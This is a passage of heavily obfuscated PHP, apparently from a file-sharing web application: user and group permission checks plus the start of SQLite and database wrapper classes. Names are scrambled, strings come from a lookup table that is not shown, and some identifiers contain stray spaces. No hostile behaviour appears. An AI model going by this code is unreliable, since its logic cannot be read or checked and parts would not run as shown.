($Ö¿·´´õ[$î£Òï—×[2055]] as $Ü·±‹«î => $ú¿çşÎä) { if (!in_array($Äºİò“ˆ, $ú¿çşÎä)) { continue; } $ı§»Œ¬ì[] = $Ü·±‹«î; } if (!$ı§»Œ¬ì) { return !1; } $ó‰ÕõŸÅ = $ı§»Œ¬ì ? $ı§»Œ¬ì[0] : $Äºİò“ˆ; return array($î£Òï—×[414] => -1, $î£Òï—×[467] => array($î£Òï—×[419] => $î£Òï—×[1194], $î£Òï—×[1868] => $î£Òï—×[198], $î£Òï—×[420] => LNG($î£Òï—×[2056]), $î£Òï—×[1885] => $î£Òï—×[2057]), $î£Òï—×[2058] => LNG($î£Òï—×[2059]), $î£Òï—×[2060] => $this->sourceAuthInfo($ó‰ÕõŸÅ)); } protected function makeAuthDeep($äËÓÌàğ = false) { $í¥Ûõ–Å =& $_SERVER[§ŒØóıü]; static $ŞÖøÌ = array(); $äËÓÌàğ = $äËÓÌàğ ? $äËÓÌàğ : USER_ID; if (isset($ŞÖøÌ[$äËÓÌàğ])) { return $ŞÖøÌ[$äËÓÌàğ]; } $·Êåœ±Ò = Model($í¥Ûõ–Å[2061])->listData(); $¦ï‹¨Ù = array(); foreach ($·Êåœ±Ò as $ ·‚º‡Ï) { if ($ ·‚º‡Ï[$í¥Ûõ–Å[413]] == 0 && $ ·‚º‡Ï[$í¥Ûõ–Å[1884]] == $í¥Ûõ–Å[88]) { $¦ï‹¨Ù[] = $ ·‚º‡Ï[$í¥Ûõ–Å[399]]; } } $ï±üìÉ = $this->userGroupParents($äËÓÌàğ); $ù‘½›Âƒ = array($í¥Ûõ–Å[411] => SourceModel::TYPE_USER, $í¥Ûõ–Å[496] => $äËÓÌàğ); if ($ï±üìÉ) { $ù‘½›Âƒ = array(array($í¥Ûõ–Å[411] => SourceModel::TYPE_USER, $í¥Ûõ–Å[496] => $äËÓÌàğ), array($í¥Ûõ–Å[411] => SourceModel::TYPE_GROUP, $í¥Ûõ–Å[496] => array($í¥Ûõ–Å[418], $ï±üìÉ)), $í¥Ûõ–Å[1006] => $í¥Ûõ–Å[1960]); } $ÉÔÍÌÇÒ = $this->field($í¥Ûõ–Å[2062])->where($ù‘½›Âƒ)->select(); $îİ§Óîø = array(); $š°‘‰‘ = array_to_keyvalue_group($ÉÔÍÌÇÒ, $í¥Ûõ–Å[402]); foreach ($š°‘‰‘ as $ï»—œ ó => $¨©óí’™) { $î‰æƒ’ = $this->authArrayCheck($¨©óí’™, $äËÓÌàğ); if ($î‰æƒ’[$í¥Ûõ–Å[414]] > 0) { $îİ§Óîø[] = $ï»—œ ó . $í¥Ûõ–Å[12]; } } if ($ï±üìÉ) { $ £Ô§’Ù = Model($í¥Ûõ–Å[512]); foreach ($ï±üìÉ as $¥¹ˆí²) { $»Ë¥×ê = $ £Ô§’Ù->getInfo($¥¹ˆí²); if (!$»Ë¥×ê || !is_array($»Ë¥×ê[$í¥Ûõ–Å[87]])) { continue; } $îİ§Óîø[] = $»Ë¥×ê[$í¥Ûõ–Å[87]][$í¥Ûõ–Å[402]]; } } $Û¶ŠõíÌ = array(); $îä“»– = $ï±üìÉ; $É‡İ¦û« = Model($í¥Ûõ–Å[1345]); $ £Ô§’Ù = Model($í¥Ûõ–Å[512]); $äè©¤¥ = array(); $‘œ¶¿£† = array(); $æØô×”• = array(); $åÉ€ìÃØ = array(); if ($îİ§Óîø) { $íˆÖ¬î = $É‡İ¦û«->where(array($í¥Ûõ–Å[402] => array($í¥Ûõ–Å[418], $îİ§Óîø)))->select(); foreach ($íˆÖ¬î as $Šµ×ãì) { $‹æĞŠÙà = $É‡İ¦û«->parentLevelArray($Šµ×ãì[$í¥Ûõ–Å[511]]); $Û¶ŠõíÌ = array_merge($Û¶ŠõíÌ, $‹æĞŠÙà); $îä“»–[] = $Šµ×ãì[$í¥Ûõ–Å[496]]; $äè©¤¥[$Šµ×ãì[$í¥Ûõ–Å[402]]] = $‹æĞŠÙà; $‘œ¶¿£†[$Šµ×ãì[$í¥Ûõ–Å[402]]] = $Šµ×ãì[$í¥Ûõ–Å[496]]; } } $îä“»– = array_values(array_unique($îä“»–)); $ÓÒÉ€§ = $îä“»–; foreach ($ÓÒÉ€§ as $¥¹ˆí²) { $»Ë¥×ê = $ £Ô§’Ù->getInfo($¥¹ˆí²); $‹æĞŠÙà = $É‡İ¦û«->parentLevelArray($»Ë¥×ê[$í¥Ûõ–Å[511]]); $îä“»– = array_merge($îä“»–, $‹æĞŠÙà); } $îä“»– = array_values(array_unique($îä“»–)); foreach ($îä“»– as $¥¹ˆí²) { $»Ë¥×ê = $ £Ô§’Ù->getInfo($¥¹ˆí²); $Û¶ŠõíÌ[] = $»Ë¥×ê[$í¥Ûõ–Å[87]][$í¥Ûõ–Å[402]]; $æØô×”•[$¥¹ˆí²] = $»Ë¥×ê[$í¥Ûõ–Å[87]][$í¥Ûõ–Å[402]]; $åÉ€ìÃØ[$¥¹ˆí²] = $É‡İ¦û«->parentLevelArray($»Ë¥×ê[$í¥Ûõ–Å[511]]); } foreach ($äè©¤¥ as $·ÁË×æñ => $€ÒË°ç€) { $‚şŞ ø = $‘œ¶¿£†[$·ÁË×æñ]; if (!$‚şŞ ø || !$æØô×”•[$‚şŞ ø]) { continue; } $Ïò¾Éİ¹ = array(); foreach ($åÉ€ìÃØ[$‚şŞ ø] as $¥¹ˆí²) { $Ïò¾Éİ¹[] = $æØô×”•[$¥¹ˆí²]; } $äè©¤¥[$·ÁË×æñ] = array_merge($Ïò¾Éİ¹, $€ÒË°ç€); } $Û¶ŠõíÌ = array_values(array_unique($Û¶ŠõíÌ)); $şû©›ä = array($í¥Ûõ–Å[2054] => $Û¶ŠõíÌ, $í¥Ûõ–Å[2055] => $äè©¤¥); $ŞÖøÌ[$äËÓÌàğ] = $şû©›ä; return $şû©›ä; } private function makeSourceAuth($ù ¼–‚™, $Œ ñÊÇı, $–Ó©ï“ = false) { $×òò±¥ı =& $_SERVER[§ŒØóıü]; $ƒıÖù— = $×òò±¥ı[88]; $‚õ££€Ÿ = $ù ¼–‚™[$×òò±¥ı[496]]; $Âç³ı­³ = $ù ¼–‚™[$×òò±¥ı[411]] == SourceModel::TYPE_GROUP; $¯ö¡£Ø = $Âç³ı­³ ? $this->groupRootAuth($‚õ££€Ÿ, $–Ó©ï“) : !1; if ($¯ö¡£Ø && Model($×òò±¥ı[498])->authCheckAction($¯ö¡£Ø[$×òò±¥ı[413]], $×òò±¥ı[1883])) { return $this->groupAuthInfo($¯ö¡£Ø, $‚õ££€Ÿ); } $€ôÃ¼îå = Model($×òò±¥ı[1345])->parentLevelArray($ù ¼–‚™[$×òò±¥ı[511]]); $€ôÃ¼îå = array_merge(array($ù ¼–‚™[$×òò±¥ı[402]]), array_reverse($€ôÃ¼îå)); $ˆ¬ñÁ‰Ø = !1; foreach ($€ôÃ¼îå as $‡–÷ö’) { if (!isset($Œ ñÊÇı[$‡–÷ö’])) { continue; } $ººÊšŞ = $this->authMake($Œ ñÊÇı[$‡–÷ö’], $–Ó©ï“); if ($ººÊšŞ[$×òò±¥ı[467]]) { $ˆ¬ñÁ‰Ø = $ººÊšŞ; break; } } if (!$Âç³ı­³) { return $ˆ¬ñÁ‰Ø; } if (!$ˆ¬ñÁ‰Ø && $¯ö¡£Ø) { $ˆ¬ñÁ‰Ø = $this->groupAuthInfo($¯ö¡£Ø, $‚õ££€Ÿ); } if (!$ˆ¬ñÁ‰Ø) { $«îÏá† = Model($×òò±¥ı[512])->getInfo($‚õ££€Ÿ); $÷İö‚¬è = explode($×òò±¥ı[50], trim($«îÏá†[$×òò±¥ı[511]], $×òò±¥ı[50])); $÷İö‚¬è = array_reverse($÷İö‚¬è); foreach ($÷İö‚¬è as $Ä—º¡¬) { if ($Ä—º¡¬ == $×òò±¥ı[198] || $Ä—º¡¬ == $ƒıÖù—) { continue; } $óõè…”Ê = $this->groupRootAuth($Ä—º¡¬, $–Ó©ï“); if (!$óõè…”Ê) { continue; } $ˆ¬ñÁ‰Ø = $this->groupAuthInfo($óõè…”Ê, $Ä—º¡¬); break; } } if (!$ˆ¬ñÁ‰Ø || $ˆ¬ñÁ‰Ø[$×òò±¥ı[414]] <= 0) { $ã¾™ÆÅÍ = $this->authDeepCheck($ù ¼–‚™[$×òò±¥ı[402]], $–Ó©ï“); if ($ã¾™ÆÅÍ) { $ˆ¬ñÁ‰Ø = $ã¾™ÆÅÍ; } } return $ˆ¬ñÁ‰Ø; } private function userIsRoot($¡ª×“Êğ = false) { $«©Ô‚ =& $_SERVER[§ŒØóıü]; if (!$¡ª×“Êğ && _get($GLOBALS, $«©Ô‚[494])) { return !0; } $ô÷ÓæÆ“ = Model($«©Ô‚[525])->getInfo($¡ª×“Êğ); $â¬šáú´ = Model($«©Ô‚[2063])->listData($ô÷ÓæÆ“[$«©Ô‚[1554]]); if ($â¬šáú´ && $â¬šáú´[$«©Ô‚[502]][$«©Ô‚[2064]] == 1) { return !0; } return !1; } private function sourceAuthInfo($µµ›õ‘ó) { $ö¶÷²¼­ =& $_SERVER[§ŒØóıü]; $¥éº¶àë = Model($ö¶÷²¼­[1345]); $òªÑ°ö¬ = $¥éº¶àë->sourceInfo($µµ›õ‘ó); if (!$òªÑ°ö¬) { return !1; } $¥éº¶àë->groupPathDisplay($òªÑ°ö¬); $ã¤·ñş§ = array($òªÑ°ö¬); $ã¤·ñş§ = $¥éº¶àë->_listAppendPath($ã¤·ñş§); $òªÑ°ö¬ = $ã¤·ñş§[0]; $¢Úµ¿Áó = $òªÑ°ö¬[$ö¶÷²¼­[509]]; if (isset($òªÑ°ö¬[$ö¶÷²¼­[517]])) { $õä¦Ş‚õ = explode($ö¶÷²¼­[8], trim($òªÑ°ö¬[$ö¶÷²¼­[509]], $ö¶÷²¼­[8])); array_shift($õä¦Ş‚õ); $¢Úµ¿Áó = $òªÑ°ö¬[$ö¶÷²¼­[515]] . $ö¶÷²¼­[2065] . implode($ö¶÷²¼­[8], $õä¦Ş‚õ); } return array($ö¶÷²¼­[420] => $òªÑ°ö¬[$ö¶÷²¼­[32]], $ö¶÷²¼­[84] => KodIO::make($òªÑ°ö¬[$ö¶÷²¼­[402]]), $ö¶÷²¼­[2066] => $¢Úµ¿Áó); } private function groupAuthInfo($Œğ¯æø, $ù¶õÃ¶ò) { $¯½èàÖù =& $_SERVER[§ŒØóıü]; $ Ô½¬Ãâ = Model($¯½èàÖù[512])->getInfo($ù¶õÃ¶ò); return array($¯½èàÖù[2067] => intval($Œğ¯æø[$¯½èàÖù[413]]), $¯½èàÖù[2051] => $Œğ¯æø, $¯½èàÖù[2068] => LNG($¯½èàÖù[2069]), $¯½èàÖù[2060] => array($¯½èàÖù[420] => $ Ô½¬Ãâ[$¯½èàÖù[32]], $¯½èàÖù[84] => KodIO::make($ Ô½¬Ãâ[$¯½èàÖù[87]][$¯½èàÖù[402]]), $¯½èàÖù[2066] => $ Ô½¬Ãâ[$¯½èàÖù[516]])); } protected function groupRootAuth($º¾»¦»å, $à©Óô‘§ = false) { $Çã€ø›Õ =& $_SERVER[§ŒØóıü]; $à©Óô‘§ = $à©Óô‘§ ? $à©Óô‘§ : USER_ID; $¦Èî‚• = $à©Óô‘§ . $Çã€ø›Õ[2070] . $º¾»¦»å; static $ÒéùßÌÇ = array(); if (isset($ÒéùßÌÇ[$¦Èî‚•])) { return $ÒéùßÌÇ[$¦Èî‚•]; } $‚ë×üÓ¶ = Model($Çã€ø›Õ[512])->getInfo($º¾»¦»å); $Æ°½Ó§Œ = $this->userGroupList($à©Óô‘§); $¢ßåºúÄ = isset($Æ°½Ó§Œ[$º¾»¦»å]) ? $Æ°½Ó§Œ[$º¾»¦»å][$Çã€ø›Õ[413]] : !1; if ($¢ßåºúÄ && Model($Çã€ø›Õ[498])->authCheckAction($¢ßåºúÄ[$Çã€ø›Õ[413]], $Çã€ø›Õ[1883])) { $ÒéùßÌÇ[$¦Èî‚•] = $¢ßåºúÄ; return $¢ßåºúÄ; } $Ùí“ĞêĞ = $this->sourceAuthSelect($‚ë×üÓ¶[$Çã€ø›Õ[87]][$Çã€ø›Õ[402]]); $£êè÷€ = $Ùí“ĞêĞ ? $this->authMake($Ùí“ĞêĞ, $à©Óô‘§) : !1; $ŸÌ³†š‘ = $£êè÷€ ? $£êè÷€[$Çã€ø›Õ[467]] : !1; $ÒéùßÌÇ[$¦Èî‚•] = $ŸÌ³†š‘ ? $ŸÌ³†š‘ : $¢ßåºúÄ; return $ÒéùßÌÇ[$¦Èî‚•]; } public function authOwnerApply($ÃÓ¯ñÚØ) { $È¯‹¿ö· =& $_SERVER[§ŒØóıü]; if (empty($ÃÓ¯ñÚØ[$È¯‹¿ö·[413]]) || isset($ÃÓ¯ñÚØ[$È¯‹¿ö·[2071]]) && $ÃÓ¯ñÚØ[$È¯‹¿ö·[2071]]) { return $ÃÓ¯ñÚØ; } if (AuthModel::authCheckRoot($ÃÓ¯ñÚØ[$È¯‹¿ö·[413]][$È¯‹¿ö·[414]])) { return $ÃÓ¯ñÚØ; } $À¶Ø‚‡ë = Model($È¯‹¿ö·[1345])->parentLevelArray($ÃÓ¯ñÚØ[$È¯‹¿ö·[511]]); $À¶Ø‚‡ë = array_merge(array($ÃÓ¯ñÚØ[$È¯‹¿ö·[402]]), array_reverse($À¶Ø‚‡ë)); $†ªÈÒ… = $this->sourceAuthSelect($À¶Ø‚‡ë); $¤€Ú²¦ = array(); $É½”›—Ç = array(); foreach ($†ªÈÒ… as $ÊÑõ¾²Œ => $Îú§„•©) { $º£Ç…éç = $this->authFolderOwnerUser($Îú§„•©); $¤€Ú²¦[$ÊÑõ¾²Œ] = $º£Ç…éç; $É½”›—Ç = array_merge($É½”›—Ç, $º£Ç…éç[$È¯‹¿ö·[590]]); if ($º£Ç…éç[$È¯‹¿ö·[2072]]) { break; } } if (count($É½”›—Ç) == 0) { $É½”›—Ç = $this->authFolderOwnerGroup($ÃÓ¯ñÚØ[$È¯‹¿ö·[496]]); } $É½”›—Ç = array_unique($É½”›—Ç); if (AuthModel::authCheckRoot($ÃÓ¯ñÚØ[$È¯‹¿ö·[413]][$È¯‹¿ö·[414]])) { $É½”›—Ç[] = USER_ID; } $ÃÓ¯ñÚØ[$È¯‹¿ö·[413]][$È¯‹¿ö·[2073]] = Model($È¯‹¿ö·[504])->userListInfo($É½”›—Ç); return $ÃÓ¯ñÚØ; } private function authFolderOwnerGroup($Ÿ›ÁúĞ) { $Ø¬÷Üëû =& $_SERVER[§ŒØóıü]; $†ÂĞòÁ¹ = Model($Ø¬÷Üëû[1952])->where(array($Ø¬÷Üëû[1862] => $Ÿ›ÁúĞ))->select(); $áÃ¬£ÕÂ = array(); if (!$†ÂĞòÁ¹) { return $áÃ¬£ÕÂ; } foreach ($†ÂĞòÁ¹ as $ßêÖ¥ß) { $¿àŒËË = $this->authInfo($ßêÖ¥ß); if (AuthModel::authCheckRoot($¿àŒËË[$Ø¬÷Üëû[413]])) { $áÃ¬£ÕÂ[] = $ßêÖ¥ß[$Ø¬÷Üëû[1673]]; } } return $áÃ¬£ÕÂ; } private function authFolderOwnerUser($½œÇŸ’¾) { $ö·¡¦Éê =& $_SERVER[§ŒØóıü]; $¾æ¯« = array(); $ŒÃÊ”÷œ = !1; foreach ($½œÇŸ’¾ as $óùô¦à) { $°ğ‡´¾ = $this->authInfo($óùô¦à); if ($óùô¦à[$ö·¡¦Éê[496]] == $ö·¡¦Éê[198]) { $ŒÃÊ”÷œ = !0; } if ($óùô¦à[$ö·¡¦Éê[411]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($°ğ‡´¾[$ö·¡¦Éê[413]])) { $¾æ¯«[] = $óùô¦à[$ö·¡¦Éê[496]]; } } } return array($ö·¡¦Éê[590] => $¾æ¯«, $ö·¡¦Éê[2072] => $ŒÃÊ”÷œ); } public function authMake($ÉÊ«Ö¾Ô, $ãäÛâ“õ = false) { $‰îåÛé =& $_SERVER[§ŒØóıü]; $›˜Ò¯Ñ = $this->authArrayCheck($ÉÊ«Ö¾Ô, $ãäÛâ“õ); if ($›˜Ò¯Ñ[$‰îåÛé[2074]]) { $›˜Ò¯Ñ[$‰îåÛé[2074]] = $this->sourceAuthInfo($›˜Ò¯Ñ[$‰îåÛé[2074]]); } return $›˜Ò¯Ñ; } public function authArrayCheck($£¢©ªŸ, $®‡ßß  = false) { $·‡‹•¼ =& $_SERVER[§ŒØóıü]; if (!$£¢©ªŸ) { return array($·‡‹•¼[414] => 0, $·‡‹•¼[467] => !1); } $®‡ßß  = $®‡ßß  ? $®‡ßß  : USER_ID; $í‰¼ëŒË = 0; $º­¾­“ = 0; $òËª¡‡Ù = 0; $±¶ ë‘‘ = 0; $”¡®¤´« = 0; $ÀÛÒ®Î¹ = 0; $Úæ½éËÅ = 1000; $ğÈÈËÅ = 0; $„¸È‚ó¶ = 0; $Ï¡Û´æã = 0; $Õ”âÆöé = 0; $Ñ…ÇÛ´ = array($·‡‹•¼[402] => 0); foreach ($£¢©ªŸ as $Ñ…ÇÛ´) { $«”¤’è = $this->authInfo($Ñ…ÇÛ´); if (!$«”¤’è) { continue; } $¸éÜÕå¼ = $Ñ…ÇÛ´[$·‡‹•¼[496]]; $›˜›¸¦ = intval($«”¤’è[$·‡‹•¼[413]]); if ($Ñ…ÇÛ´[$·‡‹•¼[411]] == SourceModel::TYPE_USER && $¸éÜÕå¼ == $®‡ßß ) { $í‰¼ëŒË = !0; $òËª¡‡Ù = $«”¤’è; $º­¾­“ = $›˜›¸¦; } else { if ($Ñ…ÇÛ´[$·‡‹•¼[411]] == SourceModel::TYPE_GROUP && $this->groupContainUser($¸éÜÕå¼, $®‡ßß )) { $±¶ ë‘‘ = !0; $¸–¾‡Éê = $this->groupStepToUserGroup($¸éÜÕå¼, $®‡ßß ); if ($¸–¾‡Éê < $Úæ½éËÅ) { $Úæ½éËÅ = $¸–¾‡Éê; $”¡®¤´« = $›˜›¸¦; $ÀÛÒ®Î¹ = $«”¤’è; $ğÈÈËÅ = $¸éÜÕå¼; } if ($¸–¾‡Éê == $Úæ½éËÅ && $›˜›¸¦ >= $”¡®¤´«) { $”¡®¤´« = $›˜›¸¦; $ÀÛÒ®Î¹ = $«”¤’è; $ğÈÈËÅ = $¸éÜÕå¼; } } else { if ($¸éÜÕå¼ == $·‡‹•¼[198]) { $„¸È‚ó¶ = !0; $Õ”âÆöé = $«”¤’è; $Ï¡Û´æã = $›˜›¸¦; } } } } if ($í‰¼ëŒË) { $„Á­­âó = $º­¾­“; $«”¤’è = $òËª¡‡Ù; $¦¸ñ‡È = LNG($·‡‹•¼[2075]); } else { if ($±¶ ë‘‘) { $„Á­­âó = $”¡®¤´«; $«”¤’è = $ÀÛÒ®Î¹; $Ëæ¼ñ²¾ = Model($·‡‹•¼[512])->getInfo($ğÈÈËÅ); $¦¸ñ‡È = $·‡‹•¼[162] . $Ëæ¼ñ²¾[$·‡‹•¼[516]] . $·‡‹•¼[2076] . LNG($·‡‹•¼[2077]); } else { if ($„¸È‚ó¶) { $„Á­­âó = $Ï¡Û´æã; $«”¤’è = $Õ”âÆöé; $¦¸ñ‡È = LNG($·‡‹•¼[2048]); } else { $„Á­­âó = 0; $«”¤’è = !1; $¦¸ñ‡È = $·‡‹•¼[12]; } } } $¯ºÂ… = array($·‡‹•¼[2067] => intval($„Á­­âó), $·‡‹•¼[2051] => $«”¤’è, $·‡‹•¼[2068] => $¦¸ñ‡È, $·‡‹•¼[2060] => $Ñ…ÇÛ´[$·‡‹•¼[402]]); return $¯ºÂ…; } private function groupContainUser($µ®¢¼ŠÄ, $ËÑß¡ŞÒ = false) { return in_array($µ®¢¼ŠÄ, $this->userGroupParents($ËÑß¡ŞÒ)); } private function groupStepToUserGroup($ÑÔ§à½½, $ÁŠåóÑ = false) { $şˆú»¹ù =& $_SERVER[§ŒØóıü]; $±»¤¢Ğ« = $this->userGroupList($ÁŠåóÑ); $·´©¸›Ş = 1000; $°Î·¡Ş = $GLOBALS[$şˆú»¹ù[6]][$şˆú»¹ù[89]][$şˆú»¹ù[1965]] == 1; $ĞøÎ¾œä = $°Î·¡Ş ? 3 : 2; foreach ($±»¤¢Ğ« as $¯Á“í¬) { if ($¯Á“í¬[$şˆú»¹ù[1862]] == $ÑÔ§à½½) { return 0; } $ø›õ÷“Ä = explode($şˆú»¹ù[50], trim($¯Á“í¬[$şˆú»¹ù[511]], $şˆú»¹ù[50])); if ($ø›õ÷“Ä[0] == $şˆú»¹ù[198] && count($ø›õ÷“Ä) > $ĞøÎ¾œä) { $şÙËºÀ¢ = array_reverse(array_slice($ø›õ÷“Ä, $ĞøÎ¾œä)); $²ÍÍœÎ’ = array_search($ÑÔ§à½½, $şÙËºÀ¢); if ($²ÍÍœÎ’ !== !1 && $²ÍÍœÎ’ + 1 <= $·´©¸›Ş) { $·´©¸›Ş = $²ÍÍœÎ’ + 1; } } } return $·´©¸›Ş; } private function userGroupList($šê›¸†ã = false) { $£ğó„’ˆ =& $_SERVER[§ŒØóıü]; static $©Šá€““ = array(); if (isset($©Šá€““[$šê›¸†ã])) { return $©Šá€““[$šê›¸†ã]; } $Öá©˜Õ = Model($£ğó„’ˆ[525])->getInfo($šê›¸†ã); $©Šá€““[$šê›¸†ã] = array_to_keyvalue($Öá©˜Õ[$£ğó„’ˆ[2049]], $£ğó„’ˆ[1862]); return $©Šá€““[$šê›¸†ã]; } public function userGroupParents($àŒÂÍˆ) { $Ö­ğ© =& $_SERVER[§ŒØóıü]; static $ç…œÖˆ¸ = array(); $àŒÂÍˆ = $àŒÂÍˆ ? $àŒÂÍˆ : USER_ID; if (isset($ç…œÖˆ¸[$àŒÂÍˆ])) { return $ç…œÖˆ¸[$àŒÂÍˆ]; } $éÂÑçŠÆ = $this->userGroupList($àŒÂÍˆ); $õİ“ø³Ş = array(); $ùÄÊå£Ò = $GLOBALS[$Ö­ğ©[6]][$Ö­ğ©[89]][$Ö­ğ©[1965]] == 1; $ºãÖğŒº = $ùÄÊå£Ò ? 3 : 2; foreach ($éÂÑçŠÆ as $˜°ä¾îª) { $ì¤íÓúª = array($˜°ä¾îª[$Ö­ğ©[1862]]); $¨˜Ô €± = explode($Ö­ğ©[50], trim($˜°ä¾îª[$Ö­ğ©[511]], $Ö­ğ©[50])); if ($¨˜Ô €±[0] == $Ö­ğ©[198] && count($¨˜Ô €±) > $ºãÖğŒº) { $óŸãÌŸÆ = array_slice($¨˜Ô €±, $ºãÖğŒº); $ì¤íÓúª = array_merge($ì¤íÓúª, array_reverse($óŸãÌŸÆ)); } $õİ“ø³Ş = array_merge($õİ“ø³Ş, $ì¤íÓúª); } $ç…œÖˆ¸[$àŒÂÍˆ] = array_unique($õİ“ø³Ş); return $ç…œÖˆ¸[$àŒÂÍˆ]; } public function authTargetInfoMake($°²àù­‚) { $‹š‹Ó³– =& $_SERVER[§ŒØóıü]; $õá·É÷Œ = array(); $ËØ‘¼åÂ = array(); foreach ($°²àù­‚ as $¡©¹ºÇå) { if ($¡©¹ºÇå[$‹š‹Ó³–[411]] == SourceModel::TYPE_USER) { $õá·É÷Œ[] = intval($¡©¹ºÇå[$‹š‹Ó³–[496]]); } else { if ($¡©¹ºÇå[$‹š‹Ó³–[411]] == SourceModel::TYPE_GROUP) { $ËØ‘¼åÂ[] = intval($¡©¹ºÇå[$‹š‹Ó³–[496]]); } } } if ($õá·É÷Œ) { $õá·É÷Œ = Model($‹š‹Ó³–[504])->userListInfo($õá·É÷Œ); } if ($ËØ‘¼åÂ) { $öÊÙÃ’ß = array($‹š‹Ó³–[1950] => array($‹š‹Ó³–[418], $ËØ‘¼åÂ)); $ËØ‘¼åÂ = Model($‹š‹Ó³–[512])->field($‹š‹Ó³–[2078])->where($öÊÙÃ’ß)->select(); $ËØ‘¼åÂ = array_to_keyvalue($ËØ‘¼åÂ, $‹š‹Ó³–[1862]); } return array($‹š‹Ó³–[2079] => $õá·É÷Œ, $‹š‹Ó³–[2080] => $ËØ‘¼åÂ); } public function authInfo($úÓä±¼) { $ÒÏ­®ûØ =& $_SERVER[§ŒØóıü]; if ($úÓä±¼[$ÒÏ­®ûØ[1966]]) { $÷¨µÊ = Model($ÒÏ­®ûØ[498])->listData($úÓä±¼[$ÒÏ­®ûØ[1966]]); if (!$÷¨µÊ) { return !1; $şõ—Ã§ = Model($ÒÏ­®ûØ[498])->listData(); $Ã…¼ºò = array_filter_by_field($şõ—Ã§, $ÒÏ­®ûØ[413], $ÒÏ­®ûØ[198]); return $Ã…¼ºò; } $ÓÊª¥ÕÌ = array_field_key($÷¨µÊ, array($ÒÏ­®ûØ[399], $ÒÏ­®ûØ[32], $ÒÏ­®ûØ[413], $ÒÏ­®ûØ[1885], $ÒÏ­®ûØ[1886])); $ÓÊª¥ÕÌ[$ÒÏ­®ûØ[2081]] = $úÓä±¼; return $ÓÊª¥ÕÌ; } else { return array($ÒÏ­®ûØ[419] => 0, $ÒÏ­®ûØ[1868] => $úÓä±¼[$ÒÏ­®ûØ[2026]], $ÒÏ­®ûØ[420] => $ÒÏ­®ûØ[12], $ÒÏ­®ûØ[1885] => $ÒÏ­®ûØ[2082]); } } } goto cÒêÒÖ³ˆÏ; c±À’íè†³: class DbSqlite3 extends DbSqlite3Base { public function query($©ÉÌİº) { $”ìé­˜— =& $_SERVER[§ŒØóıü]; if (!CacheLock::fileLock($”ìé­˜—[13])) { return !1; } $ÖÀŸËåñ = parent::query($©ÉÌİº); CacheLock::fileUnLock($”ìé­˜—[13]); return $ÖÀŸËåñ; } public function execute($ÔùÓ–Î÷) { $Ö¬à‹ùè =& $_SERVER[§ŒØóıü]; if (!CacheLock::fileLock($Ö¬à‹ùè[13])) { return !1; } $ğÜÕß™Â = parent::execute($ÔùÓ–Î÷); CacheLock::fileUnLock($Ö¬à‹ùè[13]); return $ğÜÕß™Â; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\x74\150\151\x6e\153\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\x71" => "\75", "\156\145\x71" => "\x3c\x3e", "\x67\164" => "\76", "\145\x67\x74" => "\x3e\x3d", "\x6c\x74" => "\74", "\x65\x6c\x74" => "\74\x3d", "\156\x6f\x74\154\151\153\145" => "\x4e\x4f\124\x20\x4c\x49\113\x45", "\154\151\x6b\x65" => "\x4c\x49\x4b\105", "\151\156" => "\111\x4e", "\156\157\164\151\x6e" => "\x4e\x4f\124\40\x49\x4e", "\156\x6f\164\x20\x69\x6e" => "\x4e\x4f\124\x20\111\x4e", "\x62\145\164\167\x65\145\156" => "\x42\105\x54\x57\x45\x45\116", "\156\157\164\x62\x65\x74\x77\145\x65\156" => "\x4e\x4f\x54\40\x42\x45\x54\127\x45\x45\116", "\156\x6f\x74\x20\142\x65\x74\167\145\145\156" => "\x4e\x4f\x54\40\x42\105\124\x57\x45\x45\x4e"); protected $selectSql = "\123\x45\114\x45\103\124\45\x44\x49\x53\x54\111\x4e\x43\x54\x25\40\45\x46\111\x45\114\104\x25\40\106\122\117\115\x20\x25\x54\x41\x42\114\105\45\45\112\117\111\116\45\x25\127\x48\105\x52\105\45\45\x47\122\117\125\x50\x25\45\110\101\x56\x49\116\x47\45\x25\117\x52\x44\105\x52\x25\x25\x4c\x49\115\x49\124\45\x20\x25\125\x4e\x49\117\116\45\x25\103\x4f\115\x4d\x45\x4e\124\x25"; protected $bind = array(); public static function getInstance() { $í¢µ—‡– = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[§ŒØóıü][966], $í¢µ—‡–); } public function factory($˜á³‡¶ò = '') { $›ØŸù²ƒ =& $_SERVER[§ŒØóıü]; $˜á³‡¶ò = $this->parseConfig($˜á³‡¶ò); if (empty($˜á³‡¶ò[$›ØŸù²ƒ[967]])) { think_exception(think_lang($›ØŸù²ƒ[968])); } $this->dbType = ucwords(strtolower($˜á³‡¶ò[$›ØŸù²ƒ[967]])); $­Ô¦Ğå = $›ØŸù²ƒ[969] . $this->dbType; if (class_exists($­Ô¦Ğå)) { $é§øâ = new $­Ô¦Ğå($˜á³‡¶ò); if ($›ØŸù²ƒ[970] != strtolower($˜á³‡¶ò[$›ØŸù²ƒ[967]])) { $é§øâ->dbType = strtoupper($this->dbType); } else { $é§øâ->dbType = $this->_getDsnType($˜á³‡¶ò[$›ØŸù²ƒ[922]]); } } else { think_exception(think_lang($›ØŸù²ƒ[971]) . $›ØŸù²ƒ[972] . $­Ô¦Ğå); } return $é§øâ; } public function __call($’¹³İ¹à, $¿ãöş») { if (method_exists($this, $’¹³İ¹à)) { return call_user_func_array(array($this, $’¹³İ¹à), $¿ãöş»); } } protected function _getDsnType($¬ëò÷óº) { $‡ğÔİ¡ = explode($_SERVER[§ŒØóıü][4], $¬ëò÷óº); $ıµìè£ = strtoupper(trim($‡ğÔİ¡[0])); return $ıµìè£; } private function parseConfig($ô–›øÙ = '') { $¥”å·ò =& $_SERVER[§ŒØóıü]; if (!empty($ô–›øÙ) && is_string($ô–›øÙ)) { $ô–›øÙ = $this->parseDSN($ô–›øÙ); } elseif (is_array($ô–›øÙ)) { $ô–›øÙ = array_change_key_case($ô–›øÙ); $ô–›øÙ = array($¥”å·ò[967] => $ô–›øÙ[$¥”å·ò[973]], $¥”å·ò[894] => $ô–›øÙ[$¥”å·ò[974]], $¥”å·ò[895] => $ô–›øÙ[$¥”å·ò[975]], $¥”å·ò[892] => $ô–›øÙ[$¥”å·ò[976]], $¥”å·ò[893] => 